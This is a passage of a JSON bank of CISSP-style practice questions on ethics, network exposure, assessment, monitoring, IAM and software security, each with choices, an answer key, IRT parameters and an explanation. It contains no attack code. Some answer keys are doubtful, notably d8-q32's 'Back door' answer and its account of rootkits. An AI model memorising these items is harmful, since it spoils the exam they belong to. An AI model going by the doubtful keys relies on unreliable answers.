      "explanation": "Correct Answer: File a formal ethics complaint with ISC2. Canon 4 requires protecting the profession — reporting credential holders who engage in misconduct is a professional obligation. ISC2 maintains jurisdiction over its members' conduct independent of employer decisions. The firm's internal HR process does not discharge the duty to report to the certifying body. Law enforcement escalation may also be appropriate under Canon 1 (protect society), but the specific professional obligation here is the ISC2 ethics complaint. Deferring to employer decisions or waiting for HR outcomes allows the misconduct to continue under a valid credential."
    },
    {
      "id": "d1-q52",
      "domain": "1 Security and Risk Management",
      "stem": "A security architect transitions to a new employer in the same industry. During onboarding, the new employer asks the architect to describe specific unpatched vulnerabilities and architectural weaknesses identified at their previous employer. The architect has this information from authorized work during prior employment. What does the ISC2 Code of Ethics require?",
      "choices": [
        "Decline to disclose specific vulnerability details or confidential client information — Canon 2 confidentiality obligations persist after employment ends and are not extinguished by resignation",
        "Provide the information since the prior employment relationship has ended and there is no ongoing legal obligation referenced",
        "Share general vulnerability categories while describing specific systems in anonymized terms as a compromise",
        "Consult personal legal counsel to determine whether the information can be shared before responding"
      ],
      "correctIndex": 0,
      "difficulty": 0.8,
      "discrimination": 1.2,
      "explanation": "Correct Answer: Decline to disclose. Canon 2 requires acting honorably and maintaining confidentiality of information obtained in professional trust. This obligation does not expire with employment — a CISSP who shares a former client's vulnerability details with a competitor violates the Code regardless of whether an explicit NDA was invoked. The absence of active legal reminders does not dissolve the ethical duty. Anonymized sharing still exposes confidential technical architecture and risk posture. Legal consultation may be prudent but does not change the ethical position — the Code is clear that confidentiality obligations survive the employment relationship."
    },
    {
      "id": "d4-q37",
      "domain": "4 Communication and Network Security",
      "stem": "During a network discovery sweep, a security analyst identifies an unregistered internal host exposing TCP/UDP 137–139, TCP 445, and TCP 1433 to the general corporate network with no segmentation controls. No asset record exists for this system. What is the MOST accurate characterization of the risk this host presents?",
      "choices": [
        "The port combination indicates a Windows-based host running SMB file-sharing and a database service — this exposes the network to SMB relay attacks, NetBIOS credential harvesting, and unrestricted direct database access, all without network segmentation controls",
        "TCP 1433 indicates a web application server that should be relocated to a screened subnet for internet-facing services",
        "TCP/UDP 137–139 indicates a legacy email relay service that requires immediate patching to address known remote code execution vulnerabilities",
        "TCP 445 indicates a remote access service that requires multi-factor authentication before the risk is significant"
      ],
      "correctIndex": 0,
      "difficulty": 0.2,
      "discrimination": 1.05,
      "explanation": "Correct Answer: The port combination indicates a Windows-based host with SMB (137–139 NetBIOS, 445 SMB) and a database listener (1433). Without segmentation this exposes the network to SMB relay/pass-the-hash attacks, NetBIOS name poisoning for credential capture, and direct unauthenticated or weakly-authenticated database connections — a significant lateral movement and data exposure risk. TCP 1433 is a database listener, not a web server. Ports 137–139 are NetBIOS name/datagram/session services, not email. TCP 445 is SMB file sharing, not a remote access service — MFA alone does not address the unrestricted network exposure."
    },
    {
      "id": "d6-q35",
      "domain": "6 Security Assessment and Testing",
      "stem": "A zero-day vulnerability is publicly disclosed for a widely deployed web server platform during business hours. No scanner signatures or CVE records are yet available. A security analyst needs to quickly identify which internal servers are potentially vulnerable. What is the MOST effective immediate approach?",
      "choices": [
        "Run a full enterprise vulnerability scan and wait for the scanner to flag affected systems once signatures are published",
        "Review the CVE database to locate the vulnerability record and associated patch documentation before taking further action",
        "Identify the affected version range from the advisory and use an automated scanner to check all web servers for that version — version-based identification works before signatures are available",
        "Deploy a custom IDS/IPS signature to detect active exploitation attempts against the affected platform"
      ],
      "correctIndex": 2,
      "difficulty": 0.5,
      "discrimination": 1.1,
      "explanation": "Correct Answer: Version-based identification using the advisory's affected version range. For zero-day vulnerabilities, scanner signatures and CVE records may not yet exist — waiting for them delays response. The fastest reliable path is identifying the affected version(s) from the disclosure advisory and querying asset inventory or running a version check across all candidate systems. Full vulnerability scans are useful but depend on signatures that don't yet exist for a zero-day. IDS/IPS signatures detect ongoing exploitation but do not identify whether a system is vulnerable — a system can be vulnerable without being actively attacked."
    },
    {
      "id": "d6-q36",
      "domain": "6 Security Assessment and Testing",
      "stem": "A cloud services provider wants to offer prospective customers assurance about the security and availability controls protecting the platform. The organization must choose an approach that will be credible to the widest range of enterprise customers. What is the MOST appropriate assurance approach?",
      "choices": [
        "Conduct an internal self-assessment against the organization's own defined security metrics and publish the results",
        "Have internal technical staff who built the systems perform the audit to leverage their detailed system knowledge",
        "Engage a qualified independent third-party auditor to assess controls against a recognized standard and issue a formal report",
        "Conduct an internal audit against a recognized framework such as COBIT and make the results available on request"
      ],
      "correctIndex": 2,
      "difficulty": 0.2,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Independent third-party audit against a recognized standard. Enterprise customers require credible, objective assurance — not self-assessments. An independent auditor with no relationship to the organization provides the objectivity that customers and regulators require. A SOC 2 Type II engagement is a common example of this approach in cloud contexts. Internal staff auditing systems they built lacks independence and objectivity. Internal audits against COBIT are more credible than internal metric self-assessments but still lack the independence of a third party. Self-assessment has the least credibility for external stakeholders."
    },
    {
      "id": "d6-q37",
      "domain": "6 Security Assessment and Testing",
      "stem": "A security team wants to continuously test their organization's defenses against advanced persistent threat (APT) techniques without the overhead of scheduling full red team engagements. They want automated, repeatable simulation of attack paths across the environment. What type of capability BEST meets this requirement?",
      "choices": [
        "A security orchestration and automated response (SOAR) platform configured to run defensive playbooks",
        "A blue team tabletop exercise program with quarterly scenario rotations",
        "A breach and attack simulation (BAS) platform — it combines offensive technique simulation with automated execution to continuously test detection and response controls against realistic threat scenarios",
        "A ticketing and change management system designed to track and remediate identified vulnerabilities"
      ],
      "correctIndex": 2,
      "difficulty": 0.6,
      "discrimination": 1.1,
      "explanation": "Correct Answer: A breach and attack simulation (BAS) platform. BAS tools combine red team (offensive) and blue team (defensive) techniques with automation, allowing organizations to continuously simulate APT behavior, lateral movement, data exfiltration attempts, and other advanced threat patterns against their live environment without requiring a fully staffed purple team for every test run. SOAR platforms automate defensive response workflows but do not simulate attacks. Tabletop exercises are valuable but manual, periodic, and scenario-limited. Ticketing systems manage remediation workflow but provide no simulation capability."
    },
    {
      "id": "d4-q38",
      "domain": "4 Communication and Network Security",
      "stem": "A penetration tester contracted for an external gray-box assessment receives the following in-scope network ranges from the client: 10.10.10.0/24 (data center), 10.10.11.0/24 (sales), 10.10.12.0/24 (billing), and 192.168.0.0/16 (wireless). The tester attempts to initiate scanning from an off-site location and cannot reach any target. What is the MOST likely reason?",
      "choices": [
        "The provided IP ranges are too large for current scanning tools to handle efficiently from a remote location",
        "All four ranges are RFC 1918 private address space — they are not routable over the public internet and cannot be reached directly from an external location without first establishing a presence inside the network boundary",
        "The IP ranges overlap and are causing routing conflicts that prevent the scanner from reaching targets",
        "The client's firewall is blocking the scanning tool's specific traffic signatures and needs a rule exception"
      ],
      "correctIndex": 1,
      "difficulty": 0.3,
      "discrimination": 1.05,
      "explanation": "Correct Answer: RFC 1918 private addresses are not internet-routable. The 10.0.0.0/8 and 192.168.0.0/16 ranges are defined by RFC 1918 as private address space — routers on the public internet will not forward packets destined for these addresses. To reach these targets, the tester must first compromise the network perimeter and establish an internal foothold, or have the client place a scanning system inside the network. The ranges do not overlap. Range size is not a limiting factor for modern scanning tools. Firewall rules would produce connection refusals, not complete unreachability across all ranges."
    },
    {
      "id": "d6-q38",
      "domain": "6 Security Assessment and Testing",
      "stem": "A security researcher discovers a critical vulnerability in a widely deployed enterprise application. The researcher notifies the vendor privately and gives them two weeks to issue a patch before publicly releasing full technical details and working exploit code. A colleague argues this timeline violates responsible disclosure norms. What is the MOST accurate assessment?",
      "choices": [
        "Two weeks is a standard responsible disclosure timeline — vendors are expected to patch within two weeks of private notification",
        "The researcher has no obligation to notify the vendor at all before publishing — public disclosure immediately maximizes pressure to patch",
        "Two weeks is insufficient for most organizations to develop, test, and deploy a patch — responsible disclosure provides a reasonable remediation window, typically 90 days, before public release",
        "The researcher's approach is correct because working exploit code should always accompany vulnerability disclosures to demonstrate legitimacy"
      ],
      "correctIndex": 2,
      "difficulty": 0.2,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Responsible disclosure provides a reasonable remediation window — typically 90 days — before public release. Two weeks is insufficient for a vendor to investigate, develop a fix, test it across supported versions, coordinate with downstream customers, and issue a patch. Responsible (also called coordinated) disclosure balances the public's right to know against giving defenders time to protect themselves. Immediate public release maximizes pressure but leaves users exposed with no fix available. Working exploit code published alongside disclosure dramatically increases risk to unpatched users. The 90-day window (as used by industry vulnerability programs) has become the widely accepted norm, with extensions possible for complex issues."
    },
    {
      "id": "d6-q39",
      "domain": "6 Security Assessment and Testing",
      "stem": "An organization has deployed a SIEM and wants to ensure that all enterprise endpoint systems provide identical log event categories and verbosity levels to the SIEM — regardless of when the systems were provisioned or who configured them locally. What is the MOST reliable approach to enforce consistent logging configuration across all endpoints?",
      "choices": [
        "Perform quarterly configuration audits to identify and remediate systems whose log settings have drifted from the baseline",
        "Enforce logging settings through centralized policy management so that the configuration is applied and re-enforced automatically, preventing local drift",
        "Configure each endpoint's local policy during initial provisioning and trust that settings will remain stable",
        "Deploy a log forwarding agent that normalizes all events at the client before transmission to the SIEM"
      ],
      "correctIndex": 1,
      "difficulty": 0.1,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Centralized policy enforcement. Pushing logging configuration through a centralized policy management system ensures settings are applied uniformly at provisioning and continuously re-enforced — local changes are overwritten at the next policy refresh cycle. Periodic audits catch drift only at audit time; changes made between cycles go undetected and unlogged. Local policy set at provisioning is subject to drift from manual changes, OS updates, and configuration inconsistencies across different deployment batches. A log forwarding agent normalizes the format of events sent to the SIEM but has no bearing on which events are being generated or captured at the source."
    },
    {
      "id": "d7-q37",
      "domain": "7 Security Operations",
      "stem": "A security team deploys a centralized SIEM ingesting logs from firewalls, servers, endpoints, and network devices across multiple geographic sites. During a major incident investigation, log timestamps from different systems are inconsistent by several minutes, making accurate event sequencing impossible. What infrastructure control would MOST directly have prevented this correlation problem?",
      "choices": [
        "Deploy a log normalization agent on all systems to standardize timestamp fields before forwarding to the SIEM",
        "Configure the SIEM to override ingested timestamps with its own internal clock at the time of log receipt",
        "Require all log sources to use a standardized syslog format to ensure consistent field structure across devices",
        "Implement Network Time Protocol (NTP) synchronization across all log-generating systems — accurate cross-system log correlation depends on all devices sharing a consistent time reference"
      ],
      "correctIndex": 3,
      "difficulty": -0.5,
      "discrimination": 1.0,
      "explanation": "Correct Answer: NTP synchronization. Accurate forensic timeline reconstruction requires all systems to agree on time — even small clock skew across devices makes event sequencing unreliable. NTP provides a network-wide time reference so that a firewall log, an endpoint alert, and a server authentication event can be placed in accurate sequence. Log normalization agents address format differences, not time skew. Overriding with SIEM receipt time loses the original event time. Syslog format standardization addresses field structure, not timestamp accuracy."
    },
    {
      "id": "d4-q39",
      "domain": "4 Communication and Network Security",
      "stem": "A penetration tester has established a limited-privilege foothold on a system inside the target network but does not have the elevated permissions needed to craft raw packets. The tester needs to enumerate open services on adjacent hosts. Which scan type is MOST appropriate given these constraints?",
      "choices": [
        "A TCP connect scan — it relies on the operating system's standard socket API to complete full three-way handshakes and does not require raw packet creation privileges",
        "A TCP SYN (half-open) scan — it is faster and stealthier because it does not complete the full handshake",
        "A UDP scan — it reaches services that do not respond to TCP probes and provides more complete service visibility",
        "An ICMP ping sweep — it identifies all live hosts on the network segment without requiring service-level interaction"
      ],
      "correctIndex": 0,
      "difficulty": 0.6,
      "discrimination": 1.1,
      "explanation": "Correct Answer: TCP connect scan. Without raw packet privileges, the tester cannot forge custom TCP headers required for SYN scans. A TCP connect scan uses the operating system's built-in connect() socket call — it works at the API level and requires no special privileges. TCP SYN scans require root/elevated access on most operating systems because they write raw IP/TCP packets. UDP scans also typically require elevated privileges and would miss TCP services. An ICMP ping sweep identifies live hosts but provides no service-level information."
    },
    {
      "id": "d6-q40",
      "domain": "6 Security Assessment and Testing",
      "stem": "A large retailer processes millions of payment card transactions annually. Management proposes having the internal security team conduct the annual PCI-DSS compliance assessment to reduce cost. What is the MOST accurate assessment of this proposal?",
      "choices": [
        "Internal teams may self-certify at any transaction volume provided the team holds relevant security certifications",
        "PCI-DSS requires high-volume merchants (Level 1) to engage a Qualified Security Assessor (QSA) for the annual Report on Compliance — internal self-assessment is only permissible for smaller, lower-volume merchants",
        "Any credentialed third-party auditor may conduct a PCI-DSS assessment — the QSA designation applies only to payment terminal hardware evaluations",
        "PCI-DSS permits internal assessments at all levels provided a senior executive signs the completed Self-Assessment Questionnaire"
      ],
      "correctIndex": 1,
      "difficulty": 0.3,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Level 1 merchants must use a QSA. PCI-DSS distinguishes between merchant levels based on annual transaction volume. Level 1 merchants (generally the highest volume) are required to undergo an annual on-site assessment by a PCI-approved Qualified Security Assessor and submit a formal Report on Compliance. Smaller merchants may self-assess using a Self-Assessment Questionnaire. An internal team conducting the assessment for a large organization would not satisfy the QSA independence requirement. The QSA designation applies to the assessor conducting the full compliance review, not specifically to hardware evaluations."
    },
    {
      "id": "d6-q41",
      "domain": "6 Security Assessment and Testing",
      "stem": "A financial services organization needs to monitor an online banking portal for performance degradation and functional failures. The monitoring system must detect problems even during off-peak hours when real user traffic is minimal. What approach BEST meets this requirement?",
      "choices": [
        "Passive traffic monitoring — capturing actual customer requests as they arrive and analyzing response times and error rates in real time",
        "Synthetic transaction monitoring — scripted transactions are continuously replayed against the application on a defined schedule, enabling proactive detection of issues independent of actual user traffic volume",
        "Real user monitoring (RUM) — recording and analyzing live user sessions as they occur to measure actual experienced performance",
        "Log threshold alerting — configuring the application server to generate alerts when error rates or response times exceed defined thresholds"
      ],
      "correctIndex": 1,
      "difficulty": 0.2,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Synthetic transaction monitoring. The key requirement is detection during low-traffic periods — passive and real-user monitoring approaches require actual user traffic to be present before they can detect issues. Synthetic monitoring uses scripted transactions that are replayed continuously regardless of whether real users are accessing the system, making it suitable for proactive and off-hours monitoring. Passive monitoring and RUM are reactive — they detect problems only when real users encounter them. Log alerting can detect errors but only after the application has already logged a failure from real or simulated traffic."
    },
    {
      "id": "d5-q38",
      "domain": "5 Identity and Access Management",
      "stem": "An internal audit finds that the organization has no systematic process for tracking provisioning approvals, role changes, access certifications, or deprovisioning — each is handled ad hoc by individual administrators with no centralized audit trail. What type of solution MOST comprehensively addresses this governance gap?",
      "choices": [
        "An identity and access management (IAM) platform — it provides structured provisioning workflows, automated role-change and deprovisioning processes, periodic access certification campaigns, and a full lifecycle audit trail across all accounts",
        "A SIEM with user behavior analytics configured to alert on anomalous access patterns and privilege escalation attempts",
        "A privileged access management (PAM) solution to monitor and record all administrator actions across production systems",
        "A centralized directory service with a role-based access control policy engine for consistent authorization decisions"
      ],
      "correctIndex": 0,
      "difficulty": -0.4,
      "discrimination": 1.0,
      "explanation": "Correct Answer: An IAM platform. The audit finding describes a lifecycle governance gap — no structured workflow for joiners, movers, or leavers, and no audit trail. IAM platforms are specifically designed to address this: they automate provisioning/deprovisioning based on HR triggers, enforce approval workflows for role changes, run periodic access certification campaigns to catch orphaned or excessive entitlements, and maintain a full audit trail. A SIEM detects anomalies after the fact but doesn't manage the lifecycle process. PAM focuses on privileged accounts, not the full user population. A directory service provides a policy engine but not lifecycle workflow management."
    },
    {
      "id": "d6-q42",
      "domain": "6 Security Assessment and Testing",
      "stem": "A web application team wants to understand actual end-user performance — including page load times, transaction error rates, and geographic latency variation — based on data collected from live users as they interact with the application. No simulated traffic should be required. What monitoring technique BEST describes this approach?",
      "choices": [
        "Synthetic transaction monitoring — replaying scripted transactions on a schedule to measure application response under controlled conditions",
        "Real user monitoring (RUM) — passively collecting performance and interaction data from actual user sessions in the live environment as they occur",
        "Log-based application performance monitoring — parsing server-side logs to identify slow queries, errors, and failed transactions",
        "Network traffic analysis — capturing application-layer packets at the network perimeter to measure server response latency"
      ],
      "correctIndex": 1,
      "difficulty": 0.3,
      "discrimination": 1.05,
      "explanation": "Correct Answer: Real user monitoring (RUM). RUM collects performance data from actual user sessions — typically via lightweight instrumentation in the application — capturing what users genuinely experience including browser render times, geographic performance variation, and real-world error rates. It does not require simulated traffic and reflects actual usage conditions. Synthetic monitoring is proactive but uses artificial transactions, not real user data. Log-based monitoring provides server-side metrics but misses client-side and network-level performance. Network traffic analysis measures server response but not full end-to-end user experience."
    },
    {
      "id": "d6-q43",
      "domain": "6 Security Assessment and Testing",
      "stem": "A security team applied a vendor patch to a critical web server vulnerability and independently verified the patch installed correctly. Two weeks later, the vulnerability scanner still flags the system as vulnerable. The team is confident the remediation was successful. What is the MOST appropriate next action?",
      "choices": [
        "Uninstall and reinstall the patch to trigger a detectable version number change in the service banner",
        "Manually edit the web server's version configuration to reflect the patched release number",
        "Open a support ticket with the scanner vendor to request an updated detection signature",
        "Document the verified remediation evidence and mark the finding as a confirmed false positive or validated exception in the vulnerability management system — scanners using banner or version fingerprinting may continue flagging systems when the vendor does not increment the detectable version string post-patch"
      ],
      "correctIndex": 3,
      "difficulty": 0.7,
      "discrimination": 1.1,
      "explanation": "Correct Answer: Document and mark as a validated false positive. Many vulnerability scanners rely on service banner text or version number strings to identify vulnerable software. When a vendor releases a patch that fixes the vulnerability but does not update the version string, the scanner cannot distinguish the patched version from the vulnerable one — producing a persistent false positive. The correct response is to document the verification evidence (patch installation log, verification test) and record a formal exception in the vulnerability management system so the finding is tracked but not misrepresented as unremediated. Reinstalling doesn't change the version string. Manual version edits risk breaking other scanner checks and the web server itself. Scanner vendor tickets may help long-term but don't resolve the immediate management tracking problem."
    },
    {
      "id": "d6-q44",
      "domain": "6 Security Assessment and Testing",
      "stem": "A compliance team at a regulated financial institution must demonstrate third-party oversight of their primary IaaS cloud provider as part of an annual compliance review. The team asks whether they can conduct a direct on-site audit of the provider's data center infrastructure and hypervisor layer. What is the MOST accurate characterization of this situation?",
      "choices": [
        "Cloud service contracts universally grant customers the right to conduct direct infrastructure audits — the organization should invoke its contractual audit rights",
        "Direct customer audits of IaaS provider infrastructure are typically not permitted — the accepted industry substitute is requesting the provider's existing third-party audit reports such as SOC 2 Type II or ISO 27001 certification",
        "The organization's internal IT team can satisfy the oversight requirement by running vulnerability scans against the provider's public-facing IP ranges",
        "Organizations that adopt IaaS are exempt from third-party oversight requirements since the provider assumes full responsibility for the infrastructure layer"
      ],
      "correctIndex": 1,
      "difficulty": 0.2,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Request the provider's existing third-party audit reports. Major IaaS providers do not allow individual customers to conduct direct infrastructure audits — the scale and multi-tenancy of cloud environments make this operationally infeasible and a security risk to other customers. Instead, providers commission independent third-party audits (SOC 2 Type II, ISO 27001, FedRAMP) and make the results available to customers. These reports serve as the accepted substitute for direct audit access and satisfy most regulatory oversight requirements. Vulnerability scanning the provider's external IPs is neither authorized nor representative of infrastructure security. IaaS customers retain compliance responsibilities for workloads they run on the platform."
    },
    {
      "id": "d6-q45",
      "domain": "6 Security Assessment and Testing",
      "stem": "A security team is planning a penetration test that spans multiple business units and involves risk of service disruption to production systems. The team lead proposes that the primary system owner can authorize the test since they own the target. Why is this approach likely insufficient?",
      "choices": [
        "Penetration test authorization must come from the CISO exclusively under most security governance frameworks",
        "System administrators who manage the target systems are the correct authorizers since they understand the technical risk",
        "A penetration test with cross-business-unit impact and production disruption risk exceeds a single service owner's authority — senior management approval is required because they bear accountability for organization-wide risk",
        "Penetration tests require change advisory board approval because they constitute a planned, scheduled change to the production environment"
      ],
      "correctIndex": 2,
      "difficulty": 0.1,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Senior management approval is required. A penetration test that spans multiple business units and risks disrupting production services has an impact scope beyond what a single service owner controls or is accountable for. Senior management holds authority for organizational risk decisions and must approve tests with this level of potential impact. Service owners have limited authority within their domain but cannot authorize risk to adjacent systems or business units. Change advisory boards manage planned changes but do not have the risk governance authority for security assessments. CISO involvement is important but the formal approval authority for organizational risk rests with senior management."
    },
    {
      "id": "d1-q53",
      "domain": "1 Security and Risk Management",
      "stem": "A risk manager wants to replace the organization's annual point-in-time risk assessment with a continuous monitoring capability that provides early warning of emerging risk trends before they materialize into incidents. Which practice MOST directly supports this objective?",
      "choices": [
        "Commission quarterly third-party risk assessments to provide more frequent snapshots of the organization's risk posture",
        "Deploy a SIEM to collect and correlate security events in real time, enabling detection of active threats as they occur",
        "Define and continuously track key risk indicators (KRIs) — quantitative or qualitative metrics that signal directional changes in risk exposure over time, enabling proactive intervention before a risk event occurs",
        "Conduct regular red team exercises to proactively identify control gaps before they are discovered and exploited by threat actors"
      ],
      "correctIndex": 2,
      "difficulty": 0.4,
      "discrimination": 1.05,
      "explanation": "Correct Answer: Key risk indicators (KRIs). KRIs are forward-looking metrics designed specifically to signal rising risk levels — for example, increasing rates of failed authentication, growing patch lag, or rising third-party security finding counts. Unlike risk assessments (point-in-time) or SIEM alerts (reactive to active events), KRIs are monitored continuously and are designed to indicate trend direction before a risk event occurs. Quarterly assessments improve frequency but remain point-in-time and retrospective. SIEM detects active incidents but does not measure risk exposure trends. Red team exercises identify vulnerabilities but are episodic and not continuous risk trend indicators."
    },
    {
      "id": "d6-q46",
      "domain": "6 Security Assessment and Testing",
      "stem": "A security team is initiating a penetration test engagement. During the planning phase, the team lead identifies several tasks: building a test lab, gathering appropriate tools, defining test type (black, gray, or white box), and obtaining formal written authorization from organizational leadership. Which task is the MOST critical to complete before any other activity begins?",
      "choices": [
        "Building a representative test lab environment to validate techniques before running them against production",
        "Determining whether the test will be conducted as a black-box, gray-box, or white-box engagement",
        "Gathering and staging the tools the team will need to conduct vulnerability scanning and exploitation",
        "Obtaining written authorization from appropriate organizational leadership — without explicit permission, all subsequent test activities constitute unauthorized access regardless of intent"
      ],
      "correctIndex": 3,
      "difficulty": -0.2,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Written authorization must come first. A penetration test without explicit written authorization is indistinguishable from an unauthorized intrusion — the tester has no legal protection and the organization has no documented consent. Authorization defines scope, limits liability, and gives the team the documented authority to proceed. All other planning activities (lab setup, tool staging, test type selection) are operationally important but meaningless without permission. No activity should occur before authorization is in place."
    },
    {
      "id": "d6-q47",
      "domain": "6 Security Assessment and Testing",
      "stem": "A penetration testing team is in the planning phase of an engagement. The client asks which data handling concern should be addressed during planning to prevent issues when the final report is delivered. What is the MOST important data handling consideration to resolve before testing begins?",
      "choices": [
        "Determining which CVE format will be used to reference identified vulnerabilities in the final report",
        "Deciding how long the final report should be based on the number of systems in scope",
        "Establishing how vulnerability data will be classified, stored, and transmitted — pen test reports contain detailed exploitation paths and vulnerability details that could cause significant harm if intercepted or improperly disclosed",
        "Confirming which systems are off-limits to prevent accidental exploitation during the vulnerability assessment phase"
      ],
      "correctIndex": 2,
      "difficulty": 0.5,
      "discrimination": 1.1,
      "explanation": "Correct Answer: Establish how vulnerability data will be classified, stored, and transmitted. Penetration test reports are among the most sensitive documents an organization produces — they detail exactly which systems are vulnerable, how to exploit them, and what data could be accessed. If the report is intercepted, stolen, or improperly shared, it hands an attacker a complete roadmap to the environment. Agreeing on encryption requirements for report delivery, storage classification, and authorized recipients before testing begins prevents this risk. CVE format is a reporting detail, not a security concern. Report length is irrelevant to security. Off-limits systems is a rules-of-engagement issue, not a report data handling concern."
    },
    {
      "id": "d6-q48",
      "domain": "6 Security Assessment and Testing",
      "stem": "A security team uses three different vulnerability scanning tools across their environment. Each tool identifies the same flaw in a web server but references it using different internal naming conventions, making it difficult to deduplicate findings and track remediation across tools. Which standard is specifically designed to provide a consistent, unified reference for identifying security vulnerabilities across different tools and sources?",
      "choices": [
        "XCCDF — the Extensible Configuration Checklist Description Format, used to create machine-readable security configuration checklists",
        "CVE — Common Vulnerabilities and Exposures, which provides a standardized naming system so that a vulnerability has the same unique identifier regardless of which tool or source references it",
        "OVAL — the Open Vulnerability and Assessment Language, used to describe the security state of a system and encode security checks in machine-readable form",
        "SCE — the Script Check Engine, designed to allow scripts to interoperate with security policy definitions"
      ],
      "correctIndex": 1,
      "difficulty": 0.3,
      "discrimination": 1.05,
      "explanation": "Correct Answer: CVE (Common Vulnerabilities and Exposures). CVE provides a standardized dictionary of publicly known security vulnerabilities where each entry has a unique identifier (e.g., CVE-2024-XXXX) that is consistent across all tools, databases, and vendors. When multiple scanners reference the same CVE ID, the team can deduplicate findings and track remediation status consistently. XCCDF provides security configuration checklists in a standardized format. OVAL describes how to test for security conditions on systems but does not provide the common vulnerability naming that CVE does. SCE enables script-based policy checks but does not address vulnerability identity reconciliation."
    },
    {
      "id": "d6-q49",
      "domain": "6 Security Assessment and Testing",
      "stem": "A vulnerability scanner flags a critical flaw in a production web server. The operations team, unable to apply the vendor patch immediately due to a code freeze, proposes four options. Which option provides NO actual security improvement and should be rejected?",
      "choices": [
        "Deploy an application-layer firewall rule to block known exploit patterns targeting this specific vulnerability",
        "Apply a vendor-recommended configuration workaround that disables the vulnerable component until the full patch can be applied",
        "Implement network-level access restrictions to limit which hosts can reach the vulnerable service",
        "Update the server's version identification string to report a patched version number so the scanner stops flagging the system"
      ],
      "correctIndex": 3,
      "difficulty": 0.4,
      "discrimination": 1.1,
      "explanation": "Correct Answer: Updating the version identification string. Changing a version banner or version string deceives the scanner into believing the software is patched — it does not change the underlying code, configuration, or behavior in any way. An attacker querying the service directly can still exploit the vulnerability regardless of what version the banner claims. This approach creates a false sense of remediation while leaving the actual risk unchanged. Application-layer firewall rules, configuration workarounds, and network access restrictions are all legitimate compensating controls that provide real (if temporary) risk reduction while patching is pending."
    },
    {
      "id": "d7-q38",
      "domain": "7 Security Operations",
      "stem": "A help desk technician receives a call from someone claiming to be a senior executive traveling abroad. The caller says their laptop failed and they urgently need their account password reset. Unable to verify the caller's identity but convinced by the urgency and claimed authority, the technician completes the reset. The account is subsequently used to access sensitive financial records overnight. What control would MOST directly have prevented this incident?",
      "choices": [
        "Require multi-factor authentication on all executive accounts so that a password reset alone is insufficient to gain access",
        "Implement a callback verification procedure — after receiving any account change request by phone, the help desk calls back on a pre-registered number to confirm the requestor's identity before completing the action",
        "Train help desk staff to be more skeptical of urgent requests and to escalate unusual calls to a supervisor",
        "Audit all help desk calls weekly and flag any account changes made without in-person verification"
      ],
      "correctIndex": 1,
      "difficulty": 0.1,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Callback verification on a pre-registered number. The attack succeeded because the technician could not verify the caller's identity — urgency and claimed authority bypassed judgment. A callback procedure directly breaks this attack: after receiving the request, the help desk disconnects and calls back on a known, pre-registered number for that account. This ensures the person receiving the callback is the legitimate account holder, regardless of how convincing the original call seemed. MFA reduces the value of the reset credential but does not prevent the social engineering from succeeding. Training improves awareness but relies on human judgment under pressure. Weekly audits are detective, not preventive."
    },
    {
      "id": "d8-q30",
      "domain": "8. Software Development Security",
      "stem": "Which option processes ensures that there is consistency between the accounting records and production environment and that unauthorized alterations to the configuration have not been made?",
      "choices": [
        "Configuration audit",
        "Configuration control",
        "Configuration identification",
        "Request control"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. Periodic configuration auditing is carried out to ensure that there is a match between the accounting records and production environment and that there are no unauthorized changes to the configuration. Option 2 is not correct because the configuration control process makes sure that any changes made to the software version adhere to the control and configuration management policies. Option 3 is not correct because configuration identification is a process whereby software product configuration in the entire organization is documented by administrators. Option 4 is not correct because request control refers to a process that lays down a framework through which consumers can make modification requests, developers can give priority to various tasks, or managers can carry out a cost/benefit analysis."
    },
    {
      "id": "d8-q31",
      "domain": "8. Software Development Security",
      "stem": "Kofi would like to acquire accounting software for his enterprise. He has approached you for advice on the most secure and safest software acquisition approach. How would you advise Kofi?",
      "choices": [
        "Download open-source software and then deploy it once the code base verification has been completed using a cryptographic checksum.",
        "Download either open-source or proprietary software, but take it to the lab environment for fuzzing before deployment.",
        "Look for very popular open-source software; ensure it has been tested for bugs by an active and large community.",
        "Approach a proprietary software vendor who is trusted and that was once tested in a deployment environment."
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. The best way to ensure that software is secure for deployment is by testing it in a lab environment through black-box testing. Option 1 is not correct because, despite code base verification through cryptographic checksum being among the best practices, it has some limitations. Option 3 is not correct because the fact that an open-source code base is popular does not give an assurance that it has undergone adequate white-box testing. Option 4 is not correct since products that are shipped by all vendors always have some security and feature flaws. A vendor's reputation or popularity is not equivalent to security. Regardless of the vendor's past reputation, any software should be subjected to a test in a lab environment whenever it is acquired."
    },
    {
      "id": "d8-q32",
      "domain": "8. Software Development Security",
      "stem": "A malicious code author managed to access Adam's files after modifying his operating system using malicious code. Which type of exploit is the attacker likely to have applied to achieve this?",
      "choices": [
        "Buffer overflow",
        "Rootkit",
        "Back door",
        "Escalation of privilege"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. Back doors refer to command sequences that are undocumented and people who are knowledgeable about back doors take advantage of them to bypass restrictions that are in place. Option 1 is not correct because buffer overflow is a situation that occurs when a developer fails to conduct a proper validation of user input to make sure that it is of the correct size. Option 2 is not correct because the rootkit refers to one of the strategies that attackers employ to execute the escalation of privilege attacks. Option 4 is not correct because the escalation of privileges refers to a situation where attackers expand their access from a normal user account to what they are not allowed to access after compromising a system."
    },
    {
      "id": "d1-q54",
      "domain": "1. Security and Risk Management",
      "stem": "As a cybersecurity professional, you observe that the enterprise's VPN allows you to copy and paste the contents from the enterprise's environment to your personal laptop. As an enthusiast, you download all of the client's Internal Design and Architecture documents for future reference and upload them to your personal cloud storage. Which option professional ethics policies have you violated?",
      "choices": [
        "ISC2 code of ethics",
        "Acceptable Use Policy (AUP)",
        "Non-Disclosure Agreement (NDA)",
        "Service Level Agreement (SLA)"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
